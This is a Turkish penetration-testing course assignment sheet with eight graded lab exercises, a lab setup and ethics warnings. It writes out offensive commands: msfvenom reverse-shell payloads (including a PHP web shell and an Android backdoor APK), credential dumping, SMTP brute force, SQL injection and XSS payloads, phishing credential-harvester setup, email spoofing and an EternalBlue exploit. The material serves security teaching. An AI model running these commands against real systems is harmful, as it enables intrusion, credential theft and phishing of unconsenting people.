# 🛡️ Güvenlik Testleri ve Penetrasyon - Pratik Ödevler

## 📚 Bu Bölümün Ödevleri (8 Adet)

---

## 📖 OKUMA ÖDEVLERİ

### 📑 Zorunlu Okumalar:
1. **Metasploit Unleashed**: https://www.metasploitunleashed.com/
2. **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
3. **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
4. **PTES Technical Guidelines**: http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
5. **SMTP Security Best Practices**: https://www.rfc-editor.org/rfc/rfc5321.html

### 📰 Ek Makaleler:
- **"The Art of Meterpreter"** - Metasploit Blog
- **"Email Security: SMTP Vulnerabilities"** - SANS Institute  
- **"Social Engineering: The Human Factor"** - Kevin Mitnick
- **"Incident Response Playbook"** - NIST Special Publication 800-61
- **"Ethical Hacking Guidelines"** - EC-Council
- **"Post-Exploitation Techniques"** - Offensive Security

### 🎬 Video Kaynaklar:
- **Metasploit Minute**: https://www.rapid7.com/fundamentals/metasploit/
- **OWASP Top 10 Videolar**: https://owasp.org/www-project-top-ten/
- **Social Engineering Toolkit Demo**: https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/

---

## 🎯 ÖDEV 1: Meterpreter Payload Master
**Süre:** 90 dakika  
**Zorluk:** Orta ⭐⭐

### 📋 Görevler:
1. 5 farklı platform için Meterpreter payload oluşturun
2. Multi/handler ile payload'ları dinleyin
3. Session kurulumu ve temel post-exploitation komutları
4. Session persistence teknikleri uygulayın

### 🔧 Payload Türleri:
```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > win_shell.exe

# Linux binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4445 -f elf > linux_shell

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4446 -f raw > web_shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4447 -f raw > python_shell.py

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4448 -o android_backdoor.apk
```

### 📊 Beklenen Çıktı:
- 5 farklı payload dosyası
- Handler konfigürasyonları
- Başarılı session ekran görüntüleri
- Persistence tekniklerinin demo'su

### ✅ Değerlendirme Kriterleri:
- Payload çeşitliliği (30%)
- Handler kurulumu (25%)
- Session yönetimi (25%)
- Persistence uygulama (20%)

---

## 🎯 ÖDEV 2: Post-Exploitation Ninja
**Süre:** 100 dakika  
**Zorluk:** İleri ⭐⭐⭐

### 📋 Görevler:
1. Windows ve Linux hedeflerde privilege escalation yapın
2. Sistem bilgilerini toplayın ve analiz edin
3. Password harvesting teknikleri uygulayın
4. Network pivoting ile diğer sistemlere erişim sağlayın

### 🔧 Post-Exploitation Teknikleri:
```bash
# Meterpreter session içinde:

# System bilgisi
sysinfo
getuid
ps

# Privilege escalation
getsystem
use priv

# Password harvesting
hashdump
load kiwi
creds_all

# Network pivoting
run autoroute -s 192.168.10.0/24
portfwd add -l 3389 -p 3389 -r 192.168.10.50
```

### 📊 Beklenen Çıktı:
- System privilege ekran görüntüsü
- Toplanan sistem bilgileri raporu
- Hash ve credential listesi
- Network pivoting demo'su

### ✅ Değerlendirme Kriterleri:
- Privilege escalation başarısı (30%)
- Bilgi toplama kapsamı (25%)
- Password harvesting (25%)
- Pivoting implementasyonu (20%)

---

## 🎯 ÖDEV 3: SMTP Güvenlik Analiz Uzmanı
**Süre:** 80 dakika  
**Zorluk:** Orta ⭐⭐

### 📋 Görevler:
1. SMTP sunucularını keşfedin ve fingerprint alın
2. SMTP komutlarını manuel olarak test edin
3. Email spoofing saldırısı gerçekleştirin
4. SMTP relay zafiyetlerini kontrol edin

### 🔧 SMTP Test Teknikleri:
```bash
# SMTP keşfi
nmap -p 25,465,587 -sV [target-range]
nmap --script smtp-commands,smtp-enum-users [target]

# Manuel SMTP test
telnet [smtp-server] 25
# VRFY username
# EXPN username  
# RCPT TO: test@domain.com

# SMTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt [target] smtp
```

### 📊 Beklenen Çıktı:
- SMTP sunucularının envanteri
- Manuel komut test sonuçları
- Spoofing saldırısı örneği
- Güvenlik açığı değerlendirmesi

### ✅ Değerlendirme Kriterleri:
- SMTP keşif kalitesi (25%)
- Manuel test becerisi (30%)
- Spoofing saldırı başarısı (25%)
- Güvenlik analizi (20%)

---

## 🎯 ÖDEV 4: Web Application Security Scanner
**Süre:** 120 dakika  
**Zorluk:** İleri ⭐⭐⭐

### 📋 Görevler:
1. Hedef web uygulamasında directory bruteforce yapın
2. SQL injection açıklarını manuel olarak test edin
3. XSS (Cross-Site Scripting) saldırıları deneyin
4. Automated web scanner (Nikto, Dirb) kullanarak kapsamlı tarama yapın

### 🔧 Web Security Testing Tools:
```bash
# Directory bruteforce
gobuster dir -u http://[target] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SQL injection manual test
# Test payloads:
# ' OR 1=1--
# ' UNION SELECT NULL,NULL,NULL--
# admin'--

# XSS test
# <script>alert('XSS')</script>
# <img src=x onerror=alert('XSS')>

# Automated scanning
nikto -h http://[target]
dirb http://[target]
```

### 📊 Beklenen Çıktı:
- Bulunan hidden directory'lerin listesi
- SQL injection PoC'leri
- XSS payload'ları ve sonuçları
- Automated scan raporları

### ✅ Değerlendirme Kriterleri:
- Directory keşif başarısı (25%)
- SQL injection testi (30%)
- XSS vulnerability tespiti (25%)
- Automated scan analizi (20%)

---

## 🎯 ÖDEV 5: Social Engineering Simulation Lab
**Süre:** 110 dakika  
**Zorluk:** İleri ⭐⭐⭐

### 📋 Görevler:
1. Hedef organizasyon hakkında OSINT toplayın
2. Convincing phishing email'i tasarlayın ve oluşturun
3. Fake web sitesi (credential harvesting) kurun
4. Social Engineering Toolkit (SET) kullanarak saldırı simülasyonu yapın

### 🔧 OSINT ve Social Engineering Tools:
```bash
# OSINT toplama
theharvester -d target-domain.com -b all
recon-ng
maltego

# SET (Social Engineering Toolkit)
sudo setoolkit

# Phishing site kurulumu
# 1. Website Attack Vectors
# 2. Credential Harvester Attack Method
# 3. Site Cloner

# Email spoofing
swaks --to target@domain.com --from admin@trusted-domain.com
```

### 📊 Beklenen Çıktı:
- OSINT raporu (email'ler, isimler, teknoloji stack)
- Phishing email tasarımı
- Fake website ekran görüntüleri
- SET saldırı simulasyonu sonuçları

### ✅ Değerlendirme Kriterleri:
- OSINT kalitesi ve kapsamı (30%)
- Phishing email realistikliği (25%)
- Fake site tasarımı (25%)
- SET kullanım becerisi (20%)

---

## 🎯 ÖDEV 6: Network Vulnerability Assessment
**Süre:** 100 dakika  
**Zorluk:** İleri ⭐⭐⭐

### 📋 Görevler:
1. Comprehensive network scan ile tüm servisleri keşfedin
2. OpenVAS veya Nessus ile automated vulnerability scan yapın
3. Manual verification ile false positive'leri ayıklayın
4. Risk-based vulnerability prioritization raporu hazırlayın

### 🔧 Vulnerability Assessment Tools:
```bash
# Comprehensive scanning
nmap -sS -sU -T4 -A -v -PE -PS22,25,80 -PA21,23,80,443,3389 [network]

# Vulnerability scanning
openvas-start
# Web interface: https://localhost:9392

# Manual verification
nmap --script vuln [specific-target]
metasploit module verification

# Reporting
# Excel/CSV export
# Executive summary creation
```

### 📊 Beklenen Çıktı:
- Network asset inventory
- Automated vulnerability scan raporu
- Manual verification sonuçları
- Risk prioritization matrisi
- Executive summary raporu

### ✅ Değerlendirme Kriterleri:
- Network discovery kapsamı (25%)
- Vulnerability scan kalitesi (30%)
- Manual verification accuracy (25%)
- Risk prioritization (20%)

---

## 🎯 ÖDEV 7: Incident Response Simulation
**Süre:** 130 dakika  
**Zorluk:** İleri ⭐⭐⭐⭐

### 📋 Görevler:
1. Simulated security incident senaryosu oluşturun
2. Digital forensics ile evidence toplama işlemi yapın
3. Log analysis ile attack timeline'ını çıkarın
4. Incident response plan'ı geliştirin ve test edin

### 🔧 Incident Response Tools:
```bash
# Log analysis
grep -i "failed\|error\|unauthorized" /var/log/auth.log
last -a | head -20
netstat -tulpn

# Digital forensics  
dd if=/dev/sda of=/tmp/disk_image.dd
volatility -f memory.dump --profile=Linux64 linux_pslist

# Network monitoring
tcpdump -i any -w capture.pcap
wireshark capture.pcap

# Timeline creation
log2timeline.py timeline.plaso disk_image.dd
psort.py -w timeline.csv timeline.plaso
```

### 📊 Beklenen Çıktı:
- Incident scenario dokümantasyonu  
- Digital evidence inventory
- Attack timeline raporu
- Incident response playbook
- Lessons learned dokümantasyonu

### ✅ Değerlendirme Kriterleri:
- Incident scenario realistikliği (25%)
- Forensics evidence kalitesi (25%)
- Timeline accuracy (25%)
- Response plan completeness (25%)

---

## 🎯 ÖDEV 8: Ethical Hacking Final Project
**Süre:** 180 dakika  
**Zorluk:** Uzman ⭐⭐⭐⭐⭐

### 📋 Görevler:
1. Full penetration test yapın (reconnaissance → exploitation → post-exploitation)
2. Multiple attack vectors kullanarak hedef sisteme erişim sağlayın
3. Business impact analizi yapın
4. Professional penetration test raporu hazırlayın
5. Remediation roadmap'i oluşturun

### 🔧 Full PenTest Methodology:
```bash
# 1. Information Gathering
nmap -sS -A -v [target-network]
theharvester -d target-domain.com -b all
dnsrecon -d target-domain.com

# 2. Vulnerability Analysis  
nmap --script vuln [targets]
nikto -h http://[web-targets]
openvas comprehensive scan

# 3. Exploitation
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/ssh/ssh_login

# 4. Post-Exploitation
meterpreter> getsystem
meterpreter> hashdump
meterpreter> screenshot

# 5. Reporting
Executive summary
Technical findings
Risk assessment
Remediation recommendations
```

### 📊 Beklenen Çıktı:
- Complete penetration test raporu (executive + technical)
- Proof-of-concept exploits
- Risk assessment matrisi
- Business impact analysis
- Remediation timeline ve cost estimate

### ✅ Değerlendirme Kriterleri:
- Methodology takip etme (20%)
- Technical skill demonstration (25%)
- Report professionalism (25%)
- Risk assessment accuracy (15%)
- Remediation practicality (15%)

---

## 🏗️ Lab Ortamı Kurulumu

### 🖥️ Gerekli Sistemler:
```bash
# Ana saldırı makinesi
Kali Linux 2023.4+ (minimum 4GB RAM, 50GB disk)

# Hedef sistemler
- Metasploitable2 (Ubuntu 8.04 based vulnerable VM)
- DVWA (Damn Vulnerable Web App)
- Windows 7/10 SP1 (unpatched)
- pfSense firewall (network segmentation için)
- Ubuntu Server 20.04 (web server, SMTP server)
```

### 📦 Essential Tools Installation:
```bash
# Metasploit ve gerekli araçlar
sudo apt update && sudo apt upgrade -y
sudo apt install metasploit-framework
sudo msfdb init

# Web security tools
sudo apt install nikto dirb gobuster sqlmap

# Social engineering tools
sudo apt install set

# Network tools
sudo apt install nmap masscan zmap

# OSINT tools
sudo apt install theharvester recon-ng

# Forensics tools
sudo apt install sleuthkit autopsy volatility
```

### 🌐 Network Topology:
```
[Kali Linux] ←→ [NAT/Bridged Network] ←→ [Vulnerable VMs]
     ↓
[Isolated Lab Network: 192.168.56.0/24]
     ↓
[pfSense Gateway] ←→ [DMZ: Web Servers]
                  ←→ [Internal: Database, File Servers]
```

---

## 📊 Değerlendirme Framework'ü

### 🏆 Scoring Matrix:

#### Technical Skills (40%):
- Tool usage proficiency
- Exploit development
- Manual testing capability
- Methodology adherence

#### Analysis & Reporting (35%):
- Vulnerability assessment accuracy
- Risk prioritization
- Business impact understanding
- Communication clarity

#### Ethics & Professionalism (25%):
- Responsible disclosure
- Legal compliance
- Documentation quality
- Continuous learning demonstration

### 📈 Progression Tracking:
```
Beginner (0-3 ödev): Basic tool usage
Intermediate (4-6 ödev): Methodical testing
Advanced (7-8 ödev): Professional pentesting
Expert (Bonus): Original research/exploits
```

---

## ⚠️ CRITICAL: Etik ve Yasal Uyarılar

### 🛡️ Etik Hacking Prensipleri:
1. **Authorization First**: Sadece izniniz olan sistemlerde test yapın
2. **Do No Harm**: Sistemlere zarar vermeyin, data çalmayın
3. **Responsible Disclosure**: Açıkları sorumlu şekilde bildirin
4. **Legal Compliance**: Yerel yasalara ve kurallara uyun
5. **Continuous Learning**: Savunma odaklı düşünün

### 🚨 Yasaklı Aktiviteler:
- ❌ Gerçek sistemlere izinsiz erişim
- ❌ DDoS saldırıları (lab dışında)
- ❌ Personal data theft
- ❌ Malicious payload distribution
- ❌ Illegal network penetration

### 📜 Legal Disclaimer:
*Bu ödevler sadece eğitim amaçlıdır. Öğrenciler bu teknikleri sadece kontrollü lab ortamında ve yasal sınırlar içinde kullanacaklarını taahhüt ederler. Yasadışı aktivitelerden eğitim kurumu sorumlu değildir.*

---

## 🚀 Kariyer Hazırlığı

### 📜 Bu Ödevlerden Sonra Hazır Olacağınız Sertifikalar:

#### Entry Level:
- **CompTIA Security+**
- **CompTIA PenTest+**
- **CEH (Certified Ethical Hacker)**

#### Professional Level:
- **OSCP (Offensive Security Certified Professional)**
- **GPEN (GIAC Penetration Tester)**
- **CISSP (Information Security)**

#### Advanced Level:
- **OSEP (Offensive Security Experienced Penetration Tester)**
- **OSCE (Offensive Security Certified Expert)**

### 🎯 Industry Readiness:
Bu ödevleri tamamladıktan sonra:
- **Junior Penetration Tester** pozisyonlarına başvurabilirsiniz
- **SOC Analyst** rollerinde çalışabilirsiniz  
- **Bug Bounty** programlarına katılabilirsiniz
- **Cybersecurity Consultant** olarak freelance çalışabilirsiniz

---

## 🎓 Final Message

**Tebrikler! Bu kapsamlı güvenlik eğitimini tamamlayarak gerçek bir ethical hacker oldunuz!** 

Artık:
✅ Professional penetration testing yapabilirsiniz
✅ Vulnerability assessment ve risk analysis yapabilirsiniz  
✅ Incident response ekiplerinde çalışabilirsiniz
✅ Cybersecurity alanında uzman olarak başlayabilirsiniz

**Remember: "With great power comes great responsibility"** 

Öğrendiğiniz bu becerileri sadece iyi amaçlar için kullanın, siber güvenlik topluluğuna katkıda bulunun ve sürekli öğrenmeye devam edin!

🌟 **Happy Ethical Hacking!** 🌟

---

*"The best defense is a good offense, but the best offense is ethical."*